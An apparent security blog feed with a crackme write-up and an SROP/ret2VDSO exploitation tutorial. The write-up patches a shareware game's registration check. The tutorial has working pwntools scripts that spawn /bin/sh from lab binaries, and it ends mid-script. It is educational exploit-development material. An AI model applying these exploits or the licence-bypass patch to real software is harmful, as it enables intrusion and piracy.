<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AssassinQ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="blog.b3ale.cn/"/>
  <updated>2020-03-20T14:56:02.447Z</updated>
  <id>blog.b3ale.cn/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Off by One All in One</title>
    <link href="blog.b3ale.cn/2020/03/20/Off-by-One-All-in-One/"/>
    <id>blog.b3ale.cn/2020/03/20/Off-by-One-All-in-One/</id>
    <published>2020-03-20T05:10:51.000Z</published>
    <updated>2020-03-20T14:56:02.447Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Enter Password and Continue Reading...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="959b0de7c757d501612f9c2d98b8d8edb8a7b96a3e5a5ecac41de54cc3df9551">d33df932e51ce781a76caf0d0eb71da80b0f6b292ade83e695ad772f46e7b110a10c3a8e7e13f1a9cfe611c37207f850a204b386bbb36a24458d8cf1b0722ad6945003d5cc14b4d5a1abd4a44b97ddd7ae8be60c5b3afec97cf274fece0fe060f2420a4b4191e797a082caed3fc7daf89b42d0a31af0d55a19210b500fcd89992bea2a4f59cf972aef7ef60ec1056d7563c3d944f231f4eaf50e067baba4f5fab0f6d9003418b02c1e9ca4a6327f6692b0c3bfe5baa1b28eac792ee64cc933ff69c4eceee84cce4038f683a54c5f569e1e868e5e16a4ca63ead1c5c7ea71a90c320561bb2727c90e9e814f0274632f7414b47d4c528d6bd8a6951a68462106d7841ab3b34494910ba162a11b80e269377a1b835c1690108944dc696548b9df6190e840e6ab4ddc200a90b6e609df089a2e07aa4c324e05fac09cd88d24a581d82e6133a07fb7aee65201b881fb2de28e62999e44967a2a91c72ad94a173c3d843f4e4d13a0e6dbcf12f54cd6316d82818ba80453fe8007c34306715a38644d8d1a83b4431359c87684464db87ad2e0065572ffcbfef8b8878b5a4f2289ce339a90477b5d7607b1810a8facd01f7e8d36fa84e6c4860fd86b941aa14c3ff96f578020b1df9eb94d8a376f6999da04450cbc8456fc00305610fc7dacccf300a9c3f479aac15f098a145c7a3b74e3c417843a4c6473838ba5bba5bae1fa0204afb27a5d292975c5a193133cda06397186d8dae2ca6c1e58d808c250b63f8f3fff5c1d1aba50db5076585e0489d19bb8e06a1726ca57fa6c33a8b1bdaae55251249220b7ca36eddd7a81826a7c051a65cbec3416f004e174136dd12181508a04d906f259e6a1bf5b3c897197e753df6e677c0d91dbae25858ea3bbb98d38bc28577910c1bef7b1759dea116f237ca9e5e0cc39e922f1bad4d6864d4eb87488a91617f7a67bf53894052ba7c62d7e263cc9c0406adf3619db33229d8115d3476d27fddf1126489bdac1bbd83ba39aff3301fc3b98cc024caa71b2c16ec0b598b7fd047aa17457b14efbb929675badf5cd5d707ad348d66f90f9d2c3e242e9af614e92bc2ae94fa4cc1249e1c212528689252f00bcd1fec799635b8dfd277a68ec4f323bff3ef88cf53adb3df3ac756435a818354c6fc630592892d5e425226a15a1281ac7dc0e710cb2c145d5053bdde7a693a567c1e57531ea77c90cc96b9ed518ec10510c198efb8e62c49ee8fd258e37b80b71288e4c5e0b8e6254810d443555313e4b828f8f989396a9360710eebc1aa8eafb8bb30c1346d68795c03542999af3fd3755e79a5134da58bab75cd8706926fc79ba85c04367ead3c39d19910358a2ab71b6125969ce429a33c60ab5bb3d3359f040edf4ad5fb66eb9257214a2fa4e6c92127b46d6da0025be0af408f3d01553c9b00613931e7adba2eadb406adfaeaa936ba5c2121169bd6502edc5ab4144c2528972f833bf751275428354d6453715928bffe01df07cef8705e45c001de0c448311f97b2f31ceb6bfe8434e7926fa61fb9e77c9f9df1806f4ef1348b92f68fd7a29780dc88f20947a22ce63f6b26ac8400b6159eb903b57de38cee21636c69692dc45f62fac3badc13430882a160c0c08953eca8817ef1a40db89d387c3612817f4e80de21d9bad652f32fc18603fcfd881d9af91ab70ce849937a82738ab2377dec687eacb7d307f01ebeb4e42e7eba05728104613936dfc80f5dd483ea01ad42d414864f30b6754ed023c0d53fdafdb9ad089b16ef4948d98f0e9b715802e301909f7b8ce4835b45f5efda2cfb759fbd6f0a265053125f7d981886dee3de6b35b491605a6dddfbc26b0fa72e55972876313e4a13417b737915d1bd3dd8fea0b19fbf14d281c5047db527337e89f17daa754ef4f330b473635f6b0a644e700a599cb578bec8ae497e423fb57372bb1e15925b959cf654d284e5179d3a38223074ac769abfc6f54c0d048c04877c6594a0b0f7165e72edb849f7f4043de78018e85656d5cc3ff9c427914a5c2b583b8b5fb15802133fbb23002fd7375ded85e3b4d4450c0af8390938c5f4fab6ab047261001473b79066cd994884d812053e79db8eac847f219db8d0043574b71b8bacb0bddef48b45a5da2151372013e1c944f7826d521ea0fb75b5bcbea0428aef23ea16091ec71d6b5cdf8f1f40120ccf76047ccdc8c4803c782b8513db1988136b09f073ab90b73df1411af0f2c62ae4cf5c9312e7fb37dfcef01440f97ff505fa88c7486c2aaa6368cb4d6e0a5aa10917a639b4e402fe13dd36fb3c43e78049fbe1e8d6efb7ed79d03122ca6cdbce860ed304eada4f0652d5c88c88ced888670f7164e58718915b8d43d67d90e46d7c4537e956736761d7a6fd743a4b1729e87b9b338cd40e31a9e1d2b64ad70155092c1b4c66625473a0f8fafda5e2644b40dd60ad7650a2eb76c746f07f9fbdb3b19b2c65d7a06fd139abb56cd87b04dde7d5f212924e9c2618e19e22c565cfff115699afa6fa7eedcbf7dc6ebefaee2ed9373cf7be87c2dacce90a5df61a784e5ed6e8515ebf3428c5806701101356171c777aa741467c2271b38bf211283790534b9e7a3378c53f5253a210f515a85258dabde8d3976853128e59854f5fc496ea71bc6e6845fdbe4c477b45a1f71e971ad24e285f32ce0311010bd150e256eccaa3b23d2dd6a1245a443c0abfdbe95317fccfb1cc0f54c843db414acc2be992d6c417f3bd6b576b4ad9c74197fee5bb9be3c21da9236f67a2117a61858eb144852fb92bbb80b067b467312e04719db454d8efc7435340e9602343a70f96274a6ca4ec03c8a43cfd2ce8e3cde9163880a0e4f27b77e8b36c0c6858365d9695f1fae6593b723632071fa5b134f9628eaa754742fe159998d8bd8ae70858b5be355a154d8ce1e7cdaf9068ab510d6b9323c2cdfd66a925f2432c0ffbcb977d19d71ab63da0b21380db1d15424d9ec39e245794865f97f82337ff132fe9d0f384b2fc3da48fa4296a1594b1b891d4d7b87c5b35d6c2b54d41886f74ee2074eabc3f8e584968aebf31843af041d2f475658adbb9481f16bd56447f99a3439ae07800fd53fdfa88af33a928f5e5fc493254d0b8c64ee067f076e6c500d5ec799955bc547354cb38ee90180a8708d83561979688d247fad2067a27a3b885725dc9642802c5e7a1020652e14cb304ee84e0b4a48d0a5d609568c11d60a8a96d4adf7709967dcbca7988a509532c3b8929f105f0ac09b4df8604e4a2a4cea3475b2050dbd86c5cedae9f98ffe5533dab3d74356074198460f81ff2a03386f4c7ecca2008950d55a312b986c6678d50acc2c8179ae2ac3024c1c10b316f700e06f5f10ef1e9ab035731fac707c892bd6b7a579a6efd5fcbd90ffd11e5dbdffe9059fd0d4eca382e9957db27d4b65a597fa5bb131afc41edd90b4971eceaef78bcc46bf96fe882fe8db80ef0a64389a22fbbd5dc626b44a9b564ee442fd3922c0abb7b1817ab46e6f66b81cc6b78cfc2356d5bb6ce94376b0ff935f8d165d3258ff5573d09da2ec4676ac8586b8529c7fb153fc484684beea2a7725c9c6778f516f6839ce9086d679f60bced86472b60bbefe194d4f5fd1fddfab4eb788914fa7f53f37233503be3373ac48181ab5c4c3904738633848f8740ce73c47cd80b9dac2f45acf2d2e682382b98b073d45128c146256906aac4a1395be582b927a966dd139d4e12def0a4062cdb8f088f19295f14cd0931df5812b7b8b683ecaf15ff57149c96703a550e64bd6aba054eeb7b6cee7e6db953717b04d54c15db32d3b48c6cc2afaa5702ce02c1531b781a40931e2829b2eae862c0ab8c1b9e3a5ed2e393f05d579eb945a6a934846de5edd0a73f83b7209060b7ff7afcaeeca9d84f999f47b1ed39</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Continue Reading...
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SameBall.exe v1.02 注册码算法浅析</title>
    <link href="blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    <id>blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/</id>
    <published>2020-03-19T05:44:56.000Z</published>
    <updated>2020-03-20T08:00:50.354Z</updated>
    
    <content type="html"><![CDATA[<p>老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>程序是一个对对碰游戏，每过一段时间，程序会检测注册表中是否有注册信息，如果没有会弹出注册窗口。</p><h1 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h1><p>先看看注册向导中会提供什么有用的信息：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/2.png" srcset="/img/loading.gif" alt></p><p>通过字符串搜索，定位到关键的几处代码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/3.png" srcset="/img/loading.gif" alt></p><p>然后单步走出这个函数，在 004063CA 处，对前面函数的结构做了一个判断，并跳有一个跳转，往下的代码，可以看出是在使用 RegSetValueA 往注册表里写东西，说明判断注册码成功后进行注册。那么只需要把这个跳转 nop 掉，或者是改成强制的 JMP 004063D0（即跳到下一条指令）即可：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/5.png" srcset="/img/loading.gif" alt></p><p>将修改保存到文件之后随便输入什么内容都能注册了。</p><h1 id="Algorithm-Analysis"><a href="#Algorithm-Analysis" class="headerlink" title="Algorithm Analysis"></a>Algorithm Analysis</h1><p>先尝试随机输入一些数据，然后根据前面的分析，可以发现在 004063B2 处进行了判断，前面的函数应该生成了注册码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/6.png" srcset="/img/loading.gif" alt></p><p>进入 00406780 函数，通过函数将两个长为 32 的字符串转为了整型，整型的字长被记录在最低字上：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/7.png" srcset="/img/loading.gif" alt></p><p>接着在在 0040686C 处发现两个字符串以及我们输入的字符串被作为参数传入：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/8.png" srcset="/img/loading.gif" alt></p><p>进入 00406570 函数之后，在 004065C0 处先对字符串的长度判断是否小于 0x100，接着判断字符串的长度是否大于零：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/9.png" srcset="/img/loading.gif" alt></p><p>然后对字符串每个字符进行判断是否在 0 ～ F 的范围内，即是否是一个十六进制字符串：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/10.png" srcset="/img/loading.gif" alt></p><p>显然如果不是的话就会出错，所以在这里设下断点，重新输入一个十六进制数 1234 作为注册码。接着继续往下，在 0040663A 处将我们的输入字符串转成了整型：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/11.png" srcset="/img/loading.gif" alt></p><p>接着往下跟进 00401AE0 函数，其中也传入了三个数字。在 00401B39 到 00401B48 处，计算 8231FC324594496514663D91E6C19989 共有多少位：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/12.png" srcset="/img/loading.gif" alt></p><p>接着将得到的位数 0x80 减去 2，开始进入下面的一个大循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/13.png" srcset="/img/loading.gif" alt></p><p>接着在循环中多次调用了 00410630 函数，其中将我们的输入自己相乘，并将结果返回：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/14.png" srcset="/img/loading.gif" alt></p><p>然后调用了 00410A40 函数，具体的汇编个人觉得是被编译器优化过后的结果，通过推测判断可以发现这个函数的运行结果为之前的乘积模 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/15.png" srcset="/img/loading.gif" alt></p><p>接着在后面取出了 8231FC324594496514663D91E6C19989，去最高的字并右移 0x1E 位，判断最低位是否为 1，如果为 1 进行下面的一堆乘法操作；反之跳过这段内容。看到这段内容，回想起以前做 ACM 的时候接触过的快速幂算法，按比特判断是否加上对应的次方：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/16.png" srcset="/img/loading.gif" alt></p><p>如果为 0，跳转到最下面，将迭代的数字减一，并开始下一个循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/17.png" srcset="/img/loading.gif" alt></p><p>在接下来的循环中，如果判断相乘的数大于一个字，就会分成几个字分别和目标相乘，依次由最高字开始，每次将乘积左移 32 位后加上下一次的乘积：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/18.png" srcset="/img/loading.gif" alt></p><p>这样下来基本清楚 00401AE0 函数是将我们的输入乘上 8231FC324594496514663D91E6C19989 次方再模去 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果，推测应该是 RSA 了。后面有一些乱七八糟的函数，调试了很多遍后没发现有什么作用。最后下断点在 00401E34 这里，最后 EAX 存储的地址即为指向 0x1234 经过上面操作的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/19.png" srcset="/img/loading.gif" alt></p><p>然后在 00406570 函数的最后面 0040675F 这边停下来，发现最后将结果转成了字符串，并在 EAX 里存储了这个字符串的地址：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/20.png" srcset="/img/loading.gif" alt></p><p>最后调试的时候是将结果和 0 进行比较，这样的话注册码写 0 就行了，0 的几次方结果都是 0。测试了一下注册码写 0 的话是可以写入注册表的，但是感觉不太可能这么简单，不过前面的 RSA 算法分析应该是没有什么问题了：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/21.png" srcset="/img/loading.gif" alt></p><p>整体看下来发现动态调试确实相比静态分析能更加深入地熟悉一个程序，连续分析了两天，是一次痛苦但收获颇多的经历。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bbs.pediy.com/thread-38901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-38901.htm</a><br><a href="https://oi-wiki.org/math/quick-pow/" target="_blank" rel="noopener">https://oi-wiki.org/math/quick-pow/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Use SROP with ret2VDSO</title>
    <link href="blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/"/>
    <id>blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/</id>
    <published>2020-03-14T02:24:24.000Z</published>
    <updated>2020-03-19T15:51:15.263Z</updated>
    
    <content type="html"><![CDATA[<p>用 SROP 的时候，一般情况下很难找得到 <code>syscall ; ret</code>，这时就需要在 VDSO 中找了。</p><a id="more"></a><h1 id="What-is-VDSO"><a href="#What-is-VDSO" class="headerlink" title="What is VDSO"></a>What is VDSO</h1><p>VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。</p><blockquote><p>这里路径更好指的是，不需要使用传统的 <code>int 0x80</code> 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 <code>sysenter</code>、<code>sysexit</code>；AMD 实现了 <code>syscall</code>、<code>sysret</code>），由此自然就会出现兼容性问题。所以 Linux 实现了 <code>vsyscall</code> 接口，在底层会根据具体的结构来进行具体操作。而 <code>vsyscall</code> 就实现在 VDSO 中。</p></blockquote><p>Linux（2.6 及以上的版本）环境下执行 <code>ldd /bin/sh</code>，会发现有个名字叫 <code>linux-vdso.so.1</code>（老点的版本是 <code>linux-gate.so.1</code>）的动态文件，而系统中却找不到它，它就是 VDSO。例如：</p><pre><code class="bash">$ ldd /bin/sh    linux-vdso.so.1 =&gt;  (0x00007ffda1746000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)    /lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)</code></pre><p>不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，<code>open()</code>、<code>read()</code>、<code>write()</code>、<code>gettimeofday()</code> 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。</p><h2 id="Why-ret2VDSO"><a href="#Why-ret2VDSO" class="headerlink" title="Why ret2VDSO?"></a>Why ret2VDSO?</h2><p>在 x86 系统中，传统的系统调用 <code>int 0x80</code> 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：</p><ul><li><code>sysenter</code></li><li><code>sysexit</code></li></ul><p>VDSO 可以降低在传统的 <code>int 0x80</code> 的额外开销以及提供了 <code>sigreturn</code> 可以使用 SROP。</p><p>其中 vsyscall 固定地址中存在 <code>syscall ; ret</code>：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xffffffffff600000   0xffffffffff600000:    mov    rax,0x60   0xffffffffff600007:    syscall   0xffffffffff600009:    ret</code></pre><p>可以写一个程序做一个系统调用的测试：</p><pre><code class="cpp">#include &lt;time.h&gt;#include &lt;stdio.h&gt;typedef time_t (*time_func)(time_t *);int main(int argc, char *argv[]) {    time_t tloc;    int retval = 0;    time_func func = (time_func) 0xffffffffff600000;    retval = func(&amp;tloc);    if (retval &lt; 0) {        perror(&quot;time_func&quot;);        return -1;    }    printf(&quot;%ld\n&quot;, tloc);    return 0;}</code></pre><p>总而言之，就是在 VDSO 中存在 <code>syscall ; ret</code> 可以被 SROP 利用。</p><h2 id="How-ret2VDSO"><a href="#How-ret2VDSO" class="headerlink" title="How ret2VDSO?"></a>How ret2VDSO?</h2><p><code>sysenter</code> 其参数传递方式和 <code>int 0x80</code> 是一样的，但是需要先做好 Function Prologue：</p><pre><code class="asm">push ebp ; mov ebp, esp</code></pre><p>以及需要找到一个好的 Gadget 来做 Stack Pivot。</p><h2 id="ret2VDSO-Theory"><a href="#ret2VDSO-Theory" class="headerlink" title="ret2VDSO Theory"></a>ret2VDSO Theory</h2><p>获取 VDSO 的方法：</p><ol><li>暴力破解</li><li>通过泄漏<ul><li>使用 ld.so 中的 <code>_libc_stack_end</code> 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 <code>AT_SYSINFO_EHDR</code>；</li><li>使用 ld.so 中的 <code>_rtld_global_ro</code> 的某个 Offset 也有 VDSO 的位置。</li><li>尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的<ul><li>在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；</li><li>在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机</li></ul></li></ul></li></ol><p>查看存储 VDSO 的地址：</p><pre><code class="gdb">assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt;</code></pre><p>查看 VDSO 的地址（直接 vmmap 也行）：</p><pre><code class="gdb">assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso$2 = (const Elf32_Ehdr *) 0xf7fd8000</code></pre><p>通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：</p><pre><code class="gdb">assassinq&gt;&gt; info auxv32   AT_SYSINFO           Special system info/entry points 0xf7fd8b5033   AT_SYSINFO_EHDR      System-supplied DSO&#39;s ELF header 0xf7fd8000 &lt;--- Address of VDSO16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff6    AT_PAGESZ            System page size               409617   AT_CLKTCK            Frequency of times()           1003    AT_PHDR              Program headers for program    0x80480344    AT_PHENT             Size of program header entry   325    AT_PHNUM             Number of program headers      97    AT_BASE              Base address of interpreter    0xf7fd90008    AT_FLAGS             Flags                          0x09    AT_ENTRY             Entry point of program         0x804834011   AT_UID               Real user ID                   012   AT_EUID              Effective user ID              013   AT_GID               Real group ID                  014   AT_EGID              Effective group ID             023   AT_SECURE            Boolean, was exec setuid-like? 025   AT_RANDOM            Address of 16 random bytes     0xffffd8cb31   AT_EXECFN            File name of executable        0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;15   AT_PLATFORM          String identifying platform    0xffffd8db &quot;i686&quot;0    AT_NULL              End of vector                  0x0</code></pre><p>事实证明 VDSO 也没有非常随机，可以做一个测试：</p><pre><code class="bash">$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)$ while true; do ldd /bin/ls; done | grep 0x00007ffff7ffa000    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    ...</code></pre><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[10] = &quot;/bin/sh\x00&quot;;void pwnme() {    char s[0x100];    char *welcome = &quot;&gt; &quot;;    write(1, welcome, 2);    read(0, s, 0x400);}int main() {    pwnme();    return 0;}</code></pre><p>同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xf7fd8b71   0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;:    mov    eax,0x77   0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;:    int    0x80   0xf7fd8b78 &lt;__kernel_sigreturn+8&gt;:    nop</code></pre><p>关闭 ASLR 对 ret2VDSO 进行测试：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]context.arch = &#39;i386&#39;bin_sh_addr = 0x804a020bss_addr = 0x804a030p = process(&#39;./main&#39;)#gdb.attach(p)vdso_addr = 0xf7fd8000print &#39;Try vdso %s&#39; % hex(vdso_addr)payload = &#39;A&#39; * 0x110frame = SigreturnFrame(kernel=&quot;i386&quot;)frame.eax = constants.SYS_execveframe.ebx = bin_sh_addrframe.eip = vdso_addr + 0xb76 # address of int 0x80frame.esp = bss_addrframe.ebp = bss_addrframe.gs = 0x63frame.cs = 0x23frame.es = 0x2bframe.ds = 0x2bframe.ss = 0x2bret_addr = vdso_addr + 0xb71 # address of sigreturnpayload += p32(ret_addr) + str(frame)p.recvuntil(&#39;&gt; &#39;)p.sendline(payload)p.sendline(&#39;echo pwned&#39;)data = p.recvuntil(&#39;pwned&#39;)if data != &#39;pwned&#39;:    raise Exception, &#39;Failed&#39;p.interactive()</code></pre><p>打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *bin_sh_addr = 0x804a020bss_addr = 0x804a030vdso_range = range(0xf7600000, 0xf7700000, 0x1000)def bruteforce():    global p    context.arch = &#39;i386&#39;    p = process(&#39;./main&#39;)    global vdso_addr    vdso_addr = random.choice(vdso_range)    print &#39;Try vdso %s&#39; % hex(vdso_addr)    payload = &#39;A&#39; * 0x110    frame = SigreturnFrame(kernel=&quot;i386&quot;)    frame.eax = constants.SYS_execve    frame.ebx = bin_sh_addr    frame.eip = vdso_addr + 0xb76 # address of int 0x80    frame.esp = bss_addr    frame.ebp = bss_addr    frame.gs = 0x63    frame.cs = 0x23    frame.es = 0x2b    frame.ds = 0x2b    frame.ss = 0x2b    ret_addr = vdso_addr + 0xb71 # address of sigreturn    payload += p32(ret_addr) + str(frame)    p.recvuntil(&#39;&gt; &#39;)    p.send(payload)    p.sendline(&#39;echo pwned&#39;)    data = p.recvuntil(&#39;pwned&#39;)    if data != &#39;pwned&#39;:        info(&#39;Failed&#39;)    returnif __name__ == &#39;__main__&#39;:    global p, vdso_addr    i = 1    while True:        print &#39;Try %d&#39; % i        try:            bruteforce()        except Exception as e:            info(&#39;Wrong VDSO&#39;)            p.close()            i += 1            continue        info(&#39;vdso_addr = &#39; + hex(vdso_addr))        break    p.interactive()</code></pre><h1 id="Example-x64"><a href="#Example-x64" class="headerlink" title="Example_x64"></a>Example_x64</h1><p>64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：</p><pre><code class="nasm">section .textglobal _startjmp _startvuln:sub rsp, 8mov rax, 0 ; sys_readxor rdi, rdimov rsi, rspmov rdx, 1024syscalladd rsp, 8ret_start:call vulnmov rax, 60 ; sys_exitxor rdi, rdisyscallgadgets:mov rdi, 1retmov rax, 15retsyscallret</code></pre><p>尝试利用 vsyscall 中的 <code>syscall ; ret</code> 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./main&#39;)# id&#39;s of Auxillary VectorsAT_SYSINFO_EHDR = 0x21AT_HWCAP = 0x10AT_PAGESZ = 0x06AT_CLKTCK = 0x11AT_PHDR = 0x03AT_PHENT = 0x04AT_PHNUM = 0x05AT_BASE = 0x07AT_FLAGS = 0x08AT_ENTRY = 0x09AT_UID = 0x0bAT_EUID = 0x0cAT_GID = 0x0dAT_EGID = 0x0eAT_SECURE = 0x17AT_RANDOM = 0x19AT_EXECFN = 0x1fAT_PLATFORM = 0x0fgdb.attach(p)vuln_addr = 0x400082set_write = 0x4000acsyscall_addr = 0x400096set_sigreturn = 0x4000b2payload = &#39;/bin/sh\x00&#39;payload += p64(vuln_addr)payload += p64(set_write)payload += p64(syscall_addr)payload += &#39;A&#39; * 8payload += p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)payload = &#39;A&#39;raw_input(&#39;@&#39;)p.send(payload)ENV_AUX_VEC = p.recv(1024)QWORD_LIST = []for i in range(0, len(ENV_AUX_VEC), 8):    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) # 计算AUXV的起始地址info(hex(start_aux_vec))AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary tableAUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]info(&quot;vdso_addr = &quot; + hex(vdso_addr))bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379 # 获取“/bin/sh”地址info(&quot;bin_sh_addr = &quot; + hex(bin_sh_addr))syscall_ret = 0xffffffffff600007syscall_ret = 0x4000b8frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = 